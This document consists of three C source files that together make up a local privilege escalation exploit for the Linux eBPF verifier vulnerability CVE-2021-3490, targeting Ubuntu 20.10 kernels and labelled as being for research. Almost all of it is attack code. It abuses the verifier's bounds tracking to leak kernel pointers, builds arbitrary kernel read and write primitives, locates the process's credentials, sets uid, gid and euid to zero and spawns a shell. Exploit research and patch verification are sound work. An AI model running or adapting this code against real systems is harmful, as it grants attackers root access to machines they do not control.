/*------bpf.c-----*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <sys/socket.h>
#include <sys/syscall.h>


int bpf(int cmd, union bpf_attr *attrs)
{
    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int create_map(union bpf_attr* attrs)
{
    int ret = -1;

    ret = bpf(BPF_MAP_CREATE, attrs);

    return ret;
}

int update_map_element(int map_fd, uint64_t key, void* value, uint64_t flags)
{
    int ret = -1;

    union bpf_attr attr =
    {
        .map_fd = map_fd,
        .key    = (uint64_t)&key,
        .value  = (uint64_t)value,
        .flags  = flags,
    };

    ret = bpf(BPF_MAP_UPDATE_ELEM, &attr);

    return ret;
}

// int lookup_map_element(int map_fd, uint64_t key, void* value)
// {
//     int ret = -1;
//     union bpf_attr attr =
//     {
//         .map_fd = map_fd,
//         .key    = (uint64_t)&key,
//         .value  = (uint64_t)value,
//     };

//     ret = bpf(BPF_MAP_LOOKUP_ELEM, &attr);

//     return ret;
// }

int obj_get_info_by_fd(union bpf_attr* attrs)
{
    int ret = -1;

    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);

    return ret;
}

int run_bpf_prog(struct bpf_insn* insn, uint32_t cnt, int* prog_fd_out)
{
    int ret = -1;
    int prog_fd = -1;
    char verifier_log_buff[0x200000] = {0};
    int socks[2] = {0};
    union bpf_attr prog_attrs =
    {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = cnt,
        .insns = (uint64_t)insn,
        .license = (uint64_t)"",
        .log_level = 2,
        .log_size = sizeof(verifier_log_buff),
        .log_buf = (uint64_t)verifier_log_buff
    };

    if(NULL != prog_fd_out)
    {
        prog_fd = *prog_fd_out;
    }

    if(0 >= prog_fd)
    {
        prog_fd = bpf(BPF_PROG_LOAD, &prog_attrs);
    }

    if(0 > prog_fd)
    {
        
        goto done;
    }

    if(0 != socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    {
        goto done;
    }

    if(0 != setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(int)))
    {
        goto done;
    }

    if(0x7 != write(socks[1], "ch0mpie", 0x7))
    {
        goto done;
    }

    if(NULL != prog_fd_out)
    {
        *prog_fd_out = prog_fd;
    }

    else
    {
        close(prog_fd);
    }

    ret = 0;

done:
    close(socks[0]);
    close(socks[1]);
    return ret;
}



/*------kmem_search.c------*/
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/user.h>

#include "kernel_defs.h"
#include "kmem_search.h"
#include "exploit_configs.h"
#define TASK_LIST_OFFSET  0x578
#define TASK_CRED_OFFSET  0x6C8


char* pKernelMemory = NULL;
uint32_t uiLen = 0;


// Userspace/exploit implementations of corresponding kernel functions

static inline unsigned long shift_maxindex(unsigned int shift)
{
    return (RADIX_TREE_MAP_SIZE << shift) - 1;
}

static inline unsigned long node_maxindex(const struct radix_tree_node *node)
{
    return shift_maxindex(node->shift);
}

static inline struct radix_tree_node *entry_to_node(void *ptr)
{
    return (void *)((unsigned long)ptr & ~RADIX_TREE_INTERNAL_NODE);
}

static inline bool radix_tree_is_internal_node(void *ptr)
{
    return ((unsigned long)ptr & RADIX_TREE_ENTRY_MASK) ==
                RADIX_TREE_INTERNAL_NODE;
}

static unsigned int radix_tree_descend(exploit_context* pCtx, const struct radix_tree_node *parent,
            struct radix_tree_node **nodep, unsigned long index)
{
    unsigned int offset = 0;
    void **entry = NULL;
    struct radix_tree_node node_in = {0};

    kernel_read(pCtx, (uint64_t)parent, (char*)&node_in, sizeof(node_in));
    offset = (index >> node_in.shift) & RADIX_TREE_MAP_MASK;

    entry = node_in.slots[offset];

    *nodep = (void *)entry;
    return offset;
}

static unsigned radix_tree_load_root(exploit_context* pCtx, const struct radix_tree_root *root,
        struct radix_tree_node **nodep, unsigned long *maxindex)
{
    struct radix_tree_node *node = root->xa_head;
    struct radix_tree_node node_in = {0};
    *nodep = node;

    if (radix_tree_is_internal_node(node))
    {
        node = entry_to_node(node);
        kernel_read(pCtx, (uint64_t)node, (char*)&node_in, sizeof(node_in));
        *maxindex = node_maxindex(&node_in);
        return node_in.shift + RADIX_TREE_MAP_SHIFT;
    }

    *maxindex = 0;
    return 0;
}

void *__radix_tree_lookup(exploit_context* pCtx, const struct radix_tree_root *root,
              unsigned long index, struct radix_tree_node **nodep,
              void ***slotp)
{
    struct radix_tree_node *node, *parent;
    unsigned long maxindex;
    void **slot;
    struct radix_tree_node node_in = {0};

 restart:
    parent = NULL;
    slot = (void **)&root->xa_head;
    radix_tree_load_root(pCtx, root, &node, &maxindex);

    if (index > maxindex)
        return NULL;

    while (radix_tree_is_internal_node(node)) {
        unsigned offset;

        parent = entry_to_node(node);
        offset = radix_tree_descend(pCtx, parent, &node, index);
        kernel_read(pCtx, (uint64_t)parent, (char*)&node_in, sizeof(node_in));
        slot = node_in.slots + offset;
        if (node == RADIX_TREE_RETRY)
            goto restart;
        if (node_in.shift == 0)
            break;
    }

    if (nodep)
        *nodep = parent;
    if (slotp)
        *slotp = slot;
    return node;
}

void *radix_tree_lookup(exploit_context* pCtx, const struct radix_tree_root *root, unsigned long index)
{
    return __radix_tree_lookup(pCtx, root, index, NULL, NULL);
}

void *idr_find(exploit_context* pCtx, const struct idr *idr, unsigned long id)
{
    return radix_tree_lookup(pCtx, &idr->idr_rt, id - idr->idr_base);
}

struct pid *find_pid_ns(exploit_context* pCtx, int nr)
{
    struct pid_namespace ns = {0};

    kernel_read(pCtx, pCtx->init_pid_ns, (char*)&ns, sizeof(ns));

    return idr_find(pCtx, &ns.idr, nr);
}

int find_pid_cred(exploit_context* pCtx, pid_t pid)
{
    int ret = -1;
    uint64_t pid_struct = 0;
    uint64_t first = 0;
    uint64_t task = 0;

    pid_struct = (uint64_t)find_pid_ns(pCtx, pid);

    if(!IS_KERNEL_POINTER(pid_struct))
    {
        goto done;
    }

    kernel_read(pCtx, pid_struct + PID_TASKS_OFFSET, (char*)&first, sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(first))
    {
        goto done;
    }

    task = first - TASK_LIST_OFFSET;

    kernel_read(pCtx, task + TASK_CRED_OFFSET, (char*)&pCtx->cred, sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(pCtx->cred))
    {
        goto done;
    }
    
    ret = 0;
    
done:
    return ret;
}

// Custom search functions

char* strnstr_c(char *str, const char *substr, size_t n)
{
    char *p = str, *pEnd = str+n;
    size_t substr_len = strlen(substr);

    if(0 == substr_len)
    {
        return str;
    }

    pEnd -= (substr_len - 1);
    
    for(;p < pEnd; ++p)
    {
        if(0 == strncmp(p, substr, substr_len))
        {
            return p;
        }
    }

    return NULL;
}

int search_init_pid_ns_kstrtab(exploit_context* pCtx)
{
    int ret = -1;
    char init_pid_ns[] = "init_pid_ns";

    if(NULL == pKernelMemory)
    {
        pKernelMemory = malloc(PAGE_SIZE);
        uiLen = PAGE_SIZE;
    }

    for(uint32_t i = 0; i < KMEM_MAX_SEARCH; i+= PAGE_SIZE)
    {
        if(NULL == pKernelMemory)
        {
            
            goto done;
        }

        if(0 != kernel_read(pCtx, pCtx->array_map_ops + i, pKernelMemory + i, PAGE_SIZE))
        {
            goto done;
        }

        if(0 < i)
        {
            char* substr = strnstr_c(pKernelMemory + i - sizeof(init_pid_ns), init_pid_ns, PAGE_SIZE + sizeof(init_pid_ns));
            
            if(NULL != substr)
            {
                uint32_t offset = substr - pKernelMemory;
                pCtx->init_pid_ns_kstrtab = pCtx->array_map_ops + offset;
                ret = 0;
                break;
            }
        }

        pKernelMemory = realloc(pKernelMemory, i + 2*PAGE_SIZE);
        uiLen = i + 2*PAGE_SIZE;
    }

done:
    if((0 != ret) && (NULL != pKernelMemory))
    {
        free(pKernelMemory);
        pKernelMemory = NULL;
    }

    return ret;
}

int search_init_pid_ns_ksymtab(exploit_context* pCtx)
{
    int ret = -1;
    uint64_t pStartAddr = pCtx->array_map_ops;

    if(NULL == pKernelMemory)
    {
        goto done;
    }

    for(uint32_t i = 0; i < uiLen; i++)
    {
        uint32_t offset = *(uint32_t*)(pKernelMemory + i);

        if((pStartAddr + offset) == pCtx->init_pid_ns_kstrtab)
        {
            uint32_t value_offset = *(uint32_t*)(pKernelMemory + i - 0x4);
            pCtx-> init_pid_ns = pStartAddr + value_offset - 0x4;
            ret = 0;
            break;
        }
        
        pStartAddr++;
    }

done:
    if(NULL != pKernelMemory)
    {
        free(pKernelMemory);
        pKernelMemory = NULL;
    }

    return ret;
}

/*------exploit.c--------*?

    LPE exploit for CVE-2021-3490, targeting Ubuntu 20.10 (groovy) kernels up to and including 5.8-45.
    The vulnerability was discovered by Manfred Paul @_manfp and fixed in commit 
    https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e
    
    author: @chompie1337

    For educational/research purposes only. Use at your own risk.
*/

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/bpf.h>

#include "bpf_defs.h"
#include "kernel_defs.h"
#include "kmem_search.h"
#include "exploit_configs.h"


int kernel_read_uint(exploit_context* pCtx, uint64_t addr, uint32_t* puiData)
{
    int ret = -1;
    char vals[ARRAY_MAP_SIZE] = {0};
    uint64_t btf_addr = addr - BTF_ID_OFFSET;
    struct bpf_map_info_kernel info = {0};
    union bpf_attr attrs = 
    {
        .info.bpf_fd = pCtx->oob_map_fd,
        .info.info = (long long unsigned int)&info,
        .info.info_len = sizeof(info)
    };
    struct bpf_insn insn[] =
    {
        exploit_primitive_pt1(pCtx->oob_map_fd, pCtx->store_map_fd),
        exploit_primitive_pt2,
        // exploit reg value is BPF_MAP_BTF_OFFSET (verifier believes its 0)
        BPF_ALU64_IMM(BPF_MUL, EXPLOIT_REG, BPF_MAP_BTF_OFFSET),
        // subtract BPF_MAP_BTF_OFFSET from oob map value pointer so it points to
        // bpf_map->btf
        BPF_ALU64_REG(BPF_SUB, OOB_MAP_REG, EXPLOIT_REG),
        // load the leak address from store map
        BPF_LDX_MEM(BPF_DW, LEAK_VAL_REG, STORE_MAP_REG, 8),
        // set bpf_map->btf = leak address. using BPF syscall with command 
        // BPF_OBJ_GET_INFO_BY_FD will return the value of bpf_map->btf->id
        BPF_STX_MEM(BPF_DW, OOB_MAP_REG, LEAK_VAL_REG, 0),
        BPF_EXIT_INSN()
    };

    memcpy(&vals[sizeof(uint64_t)], &btf_addr, sizeof(uint64_t));

    if(0 != update_map_element(pCtx->store_map_fd, 0, vals, BPF_ANY))
    {
        
        goto done;
    }

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), &pCtx->prog_fd))
    {
        
        goto done;
    }

    if(0 != obj_get_info_by_fd(&attrs))
    {
        
        goto done;
    }

    *puiData = info.btf_id;
    ret = 0;

done:
    return ret;
}

int kernel_read(exploit_context* pCtx, uint64_t addr, char* buffer, uint32_t len)
{
    int ret = -1;

    for(uint32_t i = 0; i < len; i += sizeof(uint32_t))
    {
        uint32_t val = 0;

        if(0 != kernel_read_uint(pCtx, addr + i, &val))
        {
            goto done;
        }

        *(uint32_t*)(buffer + i) = val;
    }

    ret = 0;

done:
    return ret; 
}

int kernel_write_uint(exploit_context* pCtx, uint64_t addr, uint32_t val)
{
    int ret = -1;
    char vals[ARRAY_MAP_SIZE] = {0};

    // addr will be set to index(val) + 1 in array_map_get_next_key
    val -=1;

    memcpy(vals, &val, sizeof(uint32_t));

    if(0 != update_map_element(pCtx->oob_map_fd, 0, vals, addr))
    {
        
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int kernel_write(exploit_context* pCtx, uint64_t addr, char* buffer, uint32_t len)
{
    int ret = -1;

    for(uint32_t i = 0; i < len; i += sizeof(uint32_t))
    {
    	addr += i;
        uint32_t val = *(uint32_t*)(buffer + i);

        if(0 != kernel_write_uint(pCtx, addr, val))
        {
            goto done;
        }
    }

    ret = 0;

done:
    return ret; 
}

int create_bpf_maps(exploit_context* pCtx)
{
    int ret = -1;
    int oob_map_fd = -1;
    int store_map_fd = -1;
    char vals[ARRAY_MAP_SIZE] = {0};
    union bpf_attr map_attrs =
    {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = ARRAY_MAP_SIZE,
        .max_entries = 1,
    };

    oob_map_fd = create_map(&map_attrs);
    store_map_fd = create_map(&map_attrs);

    if((oob_map_fd < 0) || (store_map_fd) < 0)
    {
        
        goto done;
    }

    if(0 != update_map_element(oob_map_fd, 0, vals, BPF_ANY))
    {
        
        goto done;
    }

    if(0 != update_map_element(store_map_fd, 0, vals, BPF_ANY))
    {
        
        goto done;
    }

    pCtx->oob_map_fd = oob_map_fd;
    pCtx->store_map_fd = store_map_fd;

    ret = 0;

done:
    return ret;
}

int leak_oob_map_ptr(exploit_context* pCtx)
{
    int ret = -1;
    char vals[ARRAY_MAP_SIZE] = {0};
    struct bpf_insn insn[] =
    {
        exploit_primitive_pt1(pCtx->oob_map_fd, pCtx->store_map_fd),
        // extend the exploit register's invalid bounds to 64 bits
        BPF_MOV32_REG(EXPLOIT_REG, EXPLOIT_REG), \
        // adding a register with invalid bounds to a pointer causes the verifier to 
        // mark it as an unbounded value, so we are able to leak its value by saving it
        // in the store map
        BPF_ALU64_REG(BPF_SUB, OOB_MAP_REG, EXPLOIT_REG), \
        // put the value in leak value register
        BPF_MOV64_REG(LEAK_VAL_REG, OOB_MAP_REG), \
        // store the leaked BPF ptr into store map
        BPF_STX_MEM(BPF_DW, STORE_MAP_REG, LEAK_VAL_REG, 8), \
        BPF_EXIT_INSN()
    };

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        
        goto done;
    }

    if(0 != lookup_map_element(pCtx->store_map_fd, 0, vals))
    {
        
        goto done;
    }

    memcpy(&pCtx->oob_map_ptr, &vals[sizeof(uint64_t)], sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(pCtx->oob_map_ptr))
    {
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int leak_array_map_ops(exploit_context* pCtx)
{
    int ret = -1;
    char vals[ARRAY_MAP_SIZE] = {0};
    struct bpf_insn insn[] =
    {
        exploit_primitive_pt1(pCtx->oob_map_fd, pCtx->store_map_fd),
        exploit_primitive_pt2,
        // exploit reg value is BPF_MAP_OPS_OFFSET (verifier believes its 0)
        BPF_ALU64_IMM(BPF_MUL, EXPLOIT_REG, BPF_MAP_OPS_OFFSET),
        // subtract BPF_MAP_OPS_OFFSET from oob map value pointer, so it points 
        // to bpf_map->ops
        BPF_ALU64_REG(BPF_SUB, OOB_MAP_REG, EXPLOIT_REG),
        // read the value of array_map_ops
        BPF_LDX_MEM(BPF_DW, LEAK_VAL_REG, OOB_MAP_REG, 0),
        // store the leaked array_map_ops ptr into store map
        BPF_STX_MEM(BPF_DW, STORE_MAP_REG, LEAK_VAL_REG, 8),
        BPF_EXIT_INSN()
    };

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        
        goto done;
    }

    if(0 != lookup_map_element(pCtx->store_map_fd, 0, vals))
    {
        
        goto done;
    }

    memcpy(&pCtx->array_map_ops, &vals[sizeof(uint64_t)], sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(pCtx->array_map_ops))
    {
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int test_kernel_read(exploit_context* pCtx)
{
    int ret = -1;
    uint64_t kernel_addr = 0;

    pCtx->state = EXPLOIT_STATE_READ;

    if(0 != kernel_read(pCtx, pCtx->array_map_ops, (char*)&kernel_addr, sizeof(uint64_t)))
    {
        goto done;
    }

    if(!IS_KERNEL_POINTER(kernel_addr))
    {
        goto done;
    }

    ret = 0;  
    
done:
    return ret;
}

int prepare_kernel_write(exploit_context* pCtx)
{
    int ret = -1;
    char array_map_ops[ARRAY_MAP_SIZE] = {0};
    uint64_t array_map_get_next_key = 0;
    struct bpf_insn insn[] =
    {
        exploit_primitive_pt1(pCtx->oob_map_fd, pCtx->store_map_fd),
        exploit_primitive_pt2,
        // store copy of exploit register
        BPF_MOV64_REG(COPY_REG, EXPLOIT_REG),
        // load oob map values pointer in leak register
        BPF_LD_IMM64(LEAK_VAL_REG, pCtx->oob_map_ptr),
        // exploit reg value is BPF_MAP_OPS_OFFSET (verifier believes its 0)
        BPF_ALU64_IMM(BPF_MUL, EXPLOIT_REG, BPF_MAP_OPS_OFFSET),
        // subtract BPF_MAP_OPS_OFFSET from oob map value pointer, so it points 
        // to bpf_map->ops
        BPF_ALU64_REG(BPF_SUB, OOB_MAP_REG, EXPLOIT_REG),
        // overwrite bpf_map->ops to point to the first value in oob map, where we store
        // fake bpf_map_ops structure
        BPF_STX_MEM(BPF_DW,  OOB_MAP_REG, LEAK_VAL_REG, 0),
        // restore oob map value pointer
        BPF_ALU64_REG(BPF_ADD, OOB_MAP_REG, EXPLOIT_REG),
        // restore exploit reg
        BPF_MOV64_REG(EXPLOIT_REG, COPY_REG),
        // set constant register to 0
        BPF_MOV64_IMM(CONST_REG, 0x0),
        // exploit reg value is BPF_MAP_SPIN_LOCK_OFF_OFFSET (verifier believes its 0)
        BPF_ALU64_IMM(BPF_MUL, EXPLOIT_REG, BPF_MAP_SPIN_LOCK_OFF_OFFSET),
        // subtract BPF_MAP_SPIN_LOCK_OFF_OFFSET from oob map value pointer, so it points 
        // to bpf_map->spin_lock_off
        BPF_ALU64_REG(BPF_SUB, OOB_MAP_REG, EXPLOIT_REG),
        // set bpf_map->spin_lock_off = 0 to bypass checks 
        BPF_STX_MEM(BPF_W, OOB_MAP_REG, CONST_REG, 0),
        // restore oob map value pointer
        BPF_ALU64_REG(BPF_ADD, OOB_MAP_REG, EXPLOIT_REG),
        // restore exploit reg
        BPF_MOV64_REG(EXPLOIT_REG, COPY_REG),
        // set constant register to 0xFFFFFFFF
        BPF_MOV64_IMM(CONST_REG, 0xFFFFFFFF),
        // exploit reg value is BPF_MAP_MAX_ENTRIES_OFFSET (verifier believes its 0)
        BPF_ALU64_IMM(BPF_MUL, EXPLOIT_REG, BPF_MAP_MAX_ENTRIES_OFFSET),
        // subtract BPF_MAP_MAX_ENTRIES_OFFSET from oob map value pointer, so it points 
        // to bpf_map->max_entries
        BPF_ALU64_REG(BPF_SUB, OOB_MAP_REG, EXPLOIT_REG),
        // set bpf_map->max_entries = 0xFFFFFFFF 
        BPF_STX_MEM(BPF_W, OOB_MAP_REG, CONST_REG, 0),
        // restore oob map value pointer
        BPF_ALU64_REG(BPF_ADD, OOB_MAP_REG, EXPLOIT_REG),
        // restore exploit reg
        BPF_MOV64_REG(EXPLOIT_REG, COPY_REG),
        // set constant register to BPF_MAP_TYPE_STACK
        BPF_MOV64_IMM(CONST_REG, BPF_MAP_TYPE_STACK),
        // exploit reg value is BPF_MAP_TYPE_OFFSET (verifier believes its 0)
        BPF_ALU64_IMM(BPF_MUL, EXPLOIT_REG, BPF_MAP_TYPE_OFFSET),
        // subtract BPF_MAP_TYPE_OFFSET from oob map value pointer, so it points 
        // to bpf_map->map_type
        BPF_ALU64_REG(BPF_SUB, OOB_MAP_REG, EXPLOIT_REG),
        // set bpf_map->map_type = BPF_MAP_TYPE_STACK to be able to call map_push_elem
        BPF_STX_MEM(BPF_W, OOB_MAP_REG, CONST_REG, 0),
        BPF_EXIT_INSN()
    };

    if(0 != kernel_read(pCtx, pCtx->array_map_ops, array_map_ops, BPF_MAP_OPS_OFFSET))
    {
        goto done;
    }

    memcpy(&array_map_get_next_key, &array_map_ops[MAP_OPS_GET_NEXT_KEY_OFFSET], sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(array_map_get_next_key))
    {
        goto done;
    }

    memcpy(&array_map_ops[MAP_OPS_PUSH_ELEM_OFFSET], &array_map_get_next_key, sizeof(uint64_t));

    if(0 != update_map_element(pCtx->oob_map_fd, 0, array_map_ops, BPF_ANY))
    {
        
        goto done;
    }

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        
        goto done;
    }

    pCtx->state = EXPLOIT_STATE_WRITE;

    ret = 0;

done:
    return ret;
}

int overwrite_cred(exploit_context* pCtx)
{
    int ret = -1;

    if(0 != kernel_write_uint(pCtx, pCtx->cred + CRED_UID_OFFSET, 0))
    {
        goto done;
    }

    if(0 != kernel_write_uint(pCtx, pCtx->cred + CRED_GID_OFFSET, 0))
    {
        goto done;
    }

    if(0 != kernel_write_uint(pCtx, pCtx->cred + CRED_EUID_OFFSET, 0))
    {
        goto done;
    }

    ret = 0;

done:
    return ret;
}

void cleanup_read(exploit_context* pCtx)
{
    struct bpf_insn insn[] =
    {
        exploit_primitive_pt1(pCtx->oob_map_fd, pCtx->store_map_fd),
        exploit_primitive_pt2,
        // exploit reg value is BPF_MAP_BTF_OFFSET (verifier believes its 0)
        BPF_ALU64_IMM(BPF_MUL, EXPLOIT_REG, BPF_MAP_BTF_OFFSET),
        // subtract BPF_MAP_BTF_OFFSET from oob map value pointer so it points to
        // bpf_map->btf
        BPF_ALU64_REG(BPF_SUB, OOB_MAP_REG, EXPLOIT_REG),
        // set constant register to 0
        BPF_MOV64_IMM(CONST_REG, 0x0),
        // overwrite the value of bpf_map->btf to 0
        BPF_STX_MEM(BPF_DW, OOB_MAP_REG, CONST_REG , 0),
        BPF_EXIT_INSN()
    };

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        
    }

    pCtx->state = EXPLOIT_STATE_CLEAN;
}

void cleanup_write(exploit_context* pCtx)
{
    uint64_t null = 0;

    // restore bpf_map->btf = NULL
    if(0 != kernel_write(pCtx, pCtx->oob_map_ptr - BPF_MAP_BTF_OFFSET, (char*)&null, sizeof(uint64_t)))
    {
        
        goto done;
    }

    // restore bpf_map->map_type = BPF_MAP_TYPE_ARRAY
    if(0 != kernel_write_uint(pCtx, pCtx->oob_map_ptr - BPF_MAP_TYPE_OFFSET, BPF_MAP_TYPE_ARRAY))
    {
        
        goto done;
    }

    // We can't restore the rest of the values without breaking the write primitive, and we can't run another BPF program
    // because we overwrote spin_lock_off. However, this is enough to exit cleanly. 

    pCtx->state = EXPLOIT_STATE_CLEAN;

done:
    return;
}

void cleanup(exploit_context* pCtx)
{
    switch(pCtx->state)
    {
        case EXPLOIT_STATE_READ:
            cleanup_read(pCtx);
            break;
        case EXPLOIT_STATE_WRITE:
            cleanup_write(pCtx);
            break;
        case EXPLOIT_STATE_CLEAN:
        default:
        break;
    }
}

int main(int argc, char **argv)
{
    exploit_context ctx = {0};
    pid_t current_pid = getpid();

    if(0 != create_bpf_maps(&ctx))
    {
        
        goto done;
    }

    

    if(0 != leak_oob_map_ptr(&ctx))
    {
        
        goto done;
    }

    

    if (0 != leak_array_map_ops(&ctx))
    {
        
        goto done;
    }

    

    if(0 != test_kernel_read(&ctx))
    {
        
        goto done;
    }

    
    

    if(0 !=  search_init_pid_ns_kstrtab(&ctx))
    {
        
        goto done;
    }

    
    

    if(0 != search_init_pid_ns_ksymtab(&ctx))
    {
        
        goto done;
    }

    
    

    if(0 != find_pid_cred(&ctx, current_pid))
    {
        
        goto done;
    }

    

    if(0 != prepare_kernel_write(&ctx))
    {
        
        goto done;
    }

    

    if(0 != overwrite_cred(&ctx))
    {
        
        goto done;
    }

    
    system("sh");

done:
    cleanup(&ctx);
    return 0;
}